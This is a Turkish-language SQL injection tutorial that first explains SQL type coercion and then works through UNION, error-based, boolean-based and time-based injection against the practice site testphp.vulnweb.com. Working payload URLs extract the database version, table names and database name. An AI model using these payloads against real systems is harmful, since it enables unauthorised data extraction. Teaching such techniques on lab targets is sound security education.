<h1 align="center">SQL Injection</h1>

# SQL Ne demek
* Bir veritabanında kullanılan proglamlama dilidir. Verileri yönetmek ve tasarlamak için kullanılır. 

# SQL Injection Ne Demek?
* Saldırganın web uygulamalarındaki SQL sorgularını kendi lehine kullanabilmesidir. Adı üstünde 'SQL Enjeksiyonu'.
    ![alt text](<WebSec101 0x01_ss/image-1.png>)

# Bazı Temel SQL sorguları.
* Başlarken SQL'in temelini anlamak gerekiyor. Dilin temelinde nasıl çalıştığını anlamak SQL Injection'ı anlamaktır. Dolayısıyla burası önemli.
    * Kullanılacak bazı ifadeler için ön bilgi:
        * 'SELECT' ifadesi veritabanından veri sorgulamak için kullanılır.
        * 'string' kavramı programlama dillerinde karakterlerden oluşan dizileri ifade eder. Genellikle karakterler tırnak içinde belirtilir. 'araba', '2121231' gibi. Farklı programlama dillerinde bunları belirtme biçimi değişebilir.
        * 'INT' ifadesi integer (tam sayı) ifade eder.


* Aşağıda SQLin veritabanı mantığını anlamak amacıyla çeşitli sorgular girdik. Burada kodun bazı temel davranışlarını kavrayacağız.

    ```SQL 
    SELECT 1;
    1 --> integer sonuç.

    SELECT 2-1; --> sql veritabanı çıkarma işlemini tanıyor.
    1 --> integer sonuç.

    SELECT 2+1; --> sql veritabanı toplama işlemini tanıyor.
    3 --> integer sonuç.

    SELECT '2-1'; --> sql veritabanı string işlemini tanıyor.
    '2-1'  --> string sonuç.

    SELECT '2'-'1'; --> sql veritabanı string olarak belirtilen karakterleri tam sayıya(integer) dönüştürdü ve çıkarma işlemi yaptı.
    1 --> integer sonuç.

    SELECT '2'+'1';
    3

    SELECT '2'+'a'; --> veritabanı '2' stringini 2 sayısına(integer) dönüştürebiliyor ama aynı şeyi 'a' stringi için yapamıyor ve onu 0 olarak alıyor.
    2

    SELECT 'b'+'a'; --> veritabanı ikisini de sayıya dönüştüremiyor.
    0

    SELECT '2' '1'; --> veritabanı iki stringi de tam sayıya dönüştürüyor ve birleştiriyor.
    21

    SELECT '2' '1' 'a'; --> veritabanı burada herhangi bir matematik işlemi olmadığı için 'a' yı 0 olarak almadı ve sonuç direkt 21a oldu. 
    21a 

    SELECT '2' '1' 'a'-1; --> veritabanında 'a' bu sefer 0 olarak alındı çünkü matematik işlemi var ve 21-1 oldu ve sonuç 20. 
    20

    SELECT !1; --> !1 = 1(doğru) değil. Yani 0(yanlış).
    0


# Web Sitesi Üzerinden Uygulamalı SQL Injection

## UNION SQLi

* Şimdi bir web uygulamasında SQL Injection olup olmadığını anlamayı ve SQL Injection varsa neler yapılabileceğini göreceğiz.
* http://testphp.vulnweb.com/categories.php bu web uygulaması alıştırma yapılabilmesi için test olarak geliştirilmiştir. Çalışmamızı buradan yapacağız.


    * Kullanılacak bazı ifadeler için ön bilgi:
        * 'column' ya da kolon ifadesi veritabanında çeşitli veri değerleri taşır.
        * 'UNION SELECT' ifadesi 2 veya daha fazla SELECT sorgusunu tek bir sonuç olarak gösterir. Sorgusu yapılanların kolon(column) sayıları eşit olmalıdır yoksa bu sorgu çalışmaz.
        

* Verilen web sitesine girdikten sonra 'Browse Categories' kısmına gelip 'Posters' sekmesine tıklıyoruz ve şöyle bir ekran çıkıyor:

    ![alt text](WebSec101 0x01_ss/image-4.png)

* Burada SQL Injection tespit etmek için bir fırsat var. 'http://testphp.vulnweb.com/listproducts.php?cat=1' adresinin son kısmını 'http://testphp.vulnweb.com/listproducts.php?cat=2-1' olarak değiştirdiğinizde yine aynı siteye girdiğimizi göreceğiz: (Yukarıdaki temel bilgilerde SELECT 2-1; 1 sonucunu veriyordu.)

    ![alt text](<WebSec101 0x01_ss/image-3.png>)
    * Bu durumda SQL Injection olduğunu söyleyebiliriz. İşlemlerimize SQL Injection olduğundan emin olduktan sonra devam ediyoruz. 


* 'http://testphp.vulnweb.com/listproducts.php?cat=1' Bu sekmenin aynısından bir tane daha açıyoruz ve arama kısmındaki  sorgusunun sonuna 1 yerine 2 yazıyoruz ve bu ekran çıkıyor:

    ![alt text](<WebSec101 0x01_ss/image-5.png>)


* Ana sekmemizde (http://testphp.vulnweb.com/listproducts.php?cat=1) yazan yerin son kısmını (http://testphp.vulnweb.com/listproducts.php?cat=1 UNION SELECT 1) olarak değiştirip enter'a basıyoruz ve şöyle bir ekranla karşılaşıyoruz:

    ![alt text](<WebSec101 0x01_ss/image-2.png>)

* Gelen bu uyarı aslında bize bir yol haritası çiziyor. 'Error: The used SELECT statements have a different number of columns' uyarısı '1 UNION SELECT 1' sorgularından getirilen kolon(column) sayılarının eşleşmediğini söylüyor. Eşleşmeme nedeni ise UNION SELECT sorgusunun çalışması için sorguladıklarının kolon sayısının eşit olmayışıdır.

        ```SQL
            SELECT 1; --> sonucu 1 verir ama aynı zamanda 1 kolon getirir.
            1

* Bunun önüne geçmek için 'http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201' adresimizi 'http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11' olarak değiştiriyoruz. Burada amacımız aynı kolon sayısını bulmak bu yüzden sorgularımızı arttırıyoruz. Ekranımız yine geliyor. 'NOT: SQL INJECTION YOKSA HİÇ BİR ZAMAN KOLONLARI BULAMAZSIN. ÖNCE TESPİT SONRA ENJEKSİYON'


* referans sayfamızın(http://testphp.vulnweb.com/listproducts.php?cat=1) ve ana sayfamızın(http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11) en altına iniyoruz ve bir farklılık görüyoruz.

Ana Sayfa:
    ![alt text](<WebSec101 0x01_ss/image-6.png>) 

Referans Sayfası:
    ![alt text](<WebSec101 0x01_ss/image-7.png>)

* Ana sayfadaki en son kısımda 7 2 9 sayılarını görme sebebimiz aslında adresimizde kolon sayılarının o noktalarda eşleştiğini gösteriyor. Dolayısıyla 7 2 veya 9 olan kısımlarda biz manipülasyon yapabiliyoruz:

* 'http://testphp.vulnweb.com/listproducts.php?cat=1%20UNION%20SELECT%201,2,3,4,5,6,version(),8,9,10,11' 7 yerine versiyon yazdık ve 7 yazan yerde artık version bilgisini alıyoruz.

    ARTIK VERİ ÇIKARTMAYA BAŞLADIK
    ![alt text](<WebSec101 0x01_ss/image-8.png>)

* Şimdi veri ekranımızı biraz daha temiz hale getirebiliriz. 'http://testphp.vulnweb.com/listproducts.php?cat=-9999999%20UNION%20SELECT%201,2,3,4,5,6,version(),8,9,10,11' adresimizde '='den sonra gelen yere '-9999999' yazarsak önceki kolonlardan kurtulmuş oluyoruz ve daha temiz bir görüntü elde ediyoruz:

    ![alt text](<WebSec101 0x01_ss/image-9.png>)
    * Bunun olma sebebi aslında biz 'http://testphp.vulnweb.com/listproducts.php?cat=1' sondaki id'yi değiştirmiş olduk. Onu çok büyük bir sayıyla değiştirdiğimiz vakit veriler kayboluyor. Yani referans sitesindekiyle de değişsek yine kolonlardaki veriler kaybolacak.

* 'http://testphp.vulnweb.com/listproducts.php?cat=-9999999%20UNION%20SELECT%201,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema = database()' web adresini bu şekilde değiştiğimizde farklı bir veri akışı sağlayacağız. Buradaki 'FROM information_schema.tables WHERE table_schema = database()' sorguda aslında SQL'e ait sorguları kullanarak sitedeki kolon isimlerinin verisini çekebiliyoruz. Ve bu veriyi 7. sorgunun yerine table_name yazarak çekiyoruz.

türkçesi gibi: 
'FROM information_schema.tables WHERE table_schema = database()' = table_schema'nın veritabanına eşit olduğu yerden information_schema.tables'ı getir. Ve bu gelen bilgi de 7. sorgunun yerinde gösteriliyor çünkü oraya table_name yazdık.

YENİ ÇEKTİĞİMİZ VERİLER:
    ![alt text](<WebSec101 0x01_ss/image-10.png>)


* Burada aslında SQL injection saptandıktan sonra veri çekme işleminin ne denli detaylı hale gelebileceğini görmüş olduk. SQL parametlerine ve sorgularına hakim olunduğu taktirde adres kısmından farklı fonksiyonlar kullanılarak bir çok veri çekilebilir.


## ERROR BASED SQLi
    
* Adı üstünde 'Hataya Bağlı SQL Enjeksiyonu' yani bir syntax hatası üzerinden gerçekleşen bir veri çekme türü. Syntax hatası yoksa bu tür bir veri çekme yapılamaz.

    * Kullanılacak bazı ifadeler için ön bilgi:
    * 'syntax error' programlama dili kullanırken yazılan dizinlerde yapılan hatalar bu hatayı ifade eder.(sözdizimi hatası olarak türkçeleştirebiliriz.)
    * 'extractvalue()' adı üstünde 'değer çıkar'. Parantez içinde vereceğimiz girdilerle beraber veri tabanından değer çıkarıyor.
    * 'rand()' random'un yani rastgele'nin kısaltmasıdır. Karma işlemi yapar.
    * 'concat()' dizideki değerleri birleştirmek için kullanılır. Kısaca birleştirme işlemi yaptığını akılda tutsak yeter.


* Şimdi yine 'http://testphp.vulnweb.com/listproducts.php?cat=1' bu adrese geliyoruz ve id'nin(sonda 1 yazan yer) YANINA can'can yazıyoruz. Rastgele yazdım zaten amacımız error almak olduğu için. Adresin son hali http://testphp.vulnweb.com/listproducts.php?cat=1can'can oluyor. Bunu yazdığımızda şöyle bir error geliyor:

    ![alt text](<WebSec101 0x01_ss/image-11.png>)

* Evet syntax error verdi hedeflediğimiz gibi. Şimdi burda amacımız bu error yazısını kullanarak veri çekmek. Bunu da syntax error verecek şekilde SQL kodları yazacağız. Yani hem syntax error'u çalıştıracağız hem de kod çalıştıracağız.

* Şimdi can'can yazdığımız yeri silip onun yerine 'extractvalue(rand(), concat(1,(SELECT database())))' yazıyoruz.

    * Bu kod basitçe veri çıkartma işlemini yapan kod. Yukarıya fonksiyon açıklamlarını yazdım ama çok detaya girersek ana fikirden uzaklaşırız. Google'dan SQL fonksiyonları ile ilgili çok kaynak var zaten. Mantığını anlamak şimdilik yeterli.

* Adresin son hali şu şekilde oluyor: http://testphp.vulnweb.com/listproducts.php?cat=extractvalue(rand(), concat(1,(SELECT database())))


* Şöyle bir ekranla karşılaşıyoruz:

    ![alt text](<WebSec101 0x01_ss/image-12.png>)

* Görüldüğü üzere veritabanından veri çekebiliyoruz. Artık syntax error bize 'acuart' verisini veriyor. Bu şekilde syntax error kullanarak veri çekmeyi görmüş olduk.


## Boolean Based SQLi


* Adı üstünde boolean tabanlı sql enjeksiyonu. 

    * Kullanılacak bazı ifadeler için ön bilgi:
    * 'boolean' verilen girdilere göre doğru veya yanlış çıktısını üretir. 1 doğrudur. 0 yanlış. Programlama dillerinde oldukça fazla bulunur.
    * 'ASCII' her yazı karakterinin ASCII kodu vardır.
        ![alt text](<WebSec101 0x01_ss/image-13.png>)
        Görüldüğü üzere harflerin, sayıların ve özel karakterlerin sayı karşılığında bir kodu bulunur. Bu kodlar ASCII kodlarıdır.
    * 'ascii()' karakterin ASCII kodunu döndürür. 
    * 'substring()' belirtilen ölçütlere göre bir dizenin bir kısmını çıkartır.
        örn, substring(
            selam --> string ifadesi
            ,1    --> başlangıç noktası  
            ,1)   --> uzunluk            yani buradaki sonuçta seçilen yazı dizisi 'selam' başlangıç noktası 1 yani 's' ve uzunluk da 1. Yani sonuç 's' oluyor.

    * 'LIMIT' adı üstünde sorguya bir limit koyuyor. 
* 
        ```SQL
        SELECT * FROM haberler WHERE 
        id = 1 and ASCII(
            SUBSTRING(
                (SELECT table_name FROM information_schema.tables WHERE --> database'den veri çekmek için yukarıda gösterdiğimiz sorguların aynısı.
                table_schema=database() LIMIT 1,1) #users --> Burada limit koyuyoruz çünkü almak istediğimiz verileri daraltmak için. Yoksa her tarafta veri olur.
                ,1  --> tahmini string users yazdık ve ilk harfinin veritabanında uyuşup uyuşmadığını öğrenmek istiyoruz.
                ,1
            )
        )> 80 --> Sıcak soğuk oyunu tarzı bir oyun başlıyor.

        --> biz 'users' ilk harfinin eşleşip eşleşmediğini bulmak istiyoruz. 'u' harfinin ASCII tablosundaki sayı karşılığı 117. Dolayısıyla 117>80 olduğu için burada eğer veritabanındaki stringde gerçekten 'u' harfi varsa burası TRUE dönecek. Buradaki 80 sayısını artırıp azaltarak istediğimiz karakterlerin veritabanında var olup olmadığını anlayabiliriz. 

## TIME BASED SQLi

* Adı üstünde Zaman Tabanlı SQL Enjeksiyonu.

    * Kullanılacak bazı ifadeler için ön bilgi:
        * 'IF(a,b,c)' bu fonksiyonda bir şart(a) verilir ve doğruysa b yanlışsa c çıktısını verir.
            örn, IF(1=1, 1, 0) --> 1=1 ise 1 çıktısını ver değilse 0'ı ver.
        * 'sleep()' parantez içine verilen değer(saniye cinsinden) boyunca veritabanını uyutur. 

* Boolean Based Sqli her zaman çalışmayabilir. Bu senaryoda Time based sqli devreye giriyor.

    ```SQL 
        SELECT * FROM users WHERE id = IF(SUBSTRING(,,)1=1, sleep(5), 0) --> burda sorgu ile  veritabanından gelen cevap arasındaki süre 5 saniyeden fazlaysa aranılan değer bulundu demektir.
    
##